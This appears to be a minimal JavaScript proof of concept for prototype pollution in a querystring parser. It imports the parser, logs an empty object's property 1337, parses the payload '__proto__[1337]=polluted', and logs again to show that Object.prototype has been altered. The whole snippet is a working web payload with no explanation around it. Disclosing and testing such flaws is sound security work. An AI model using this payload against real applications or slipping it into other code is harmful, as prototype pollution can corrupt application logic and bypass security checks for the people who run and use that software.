import * as query from './component_querystring.js';
console.log({}[1337]);
query.parse('__proto__[1337]=polluted');
console.log({}[1337]);
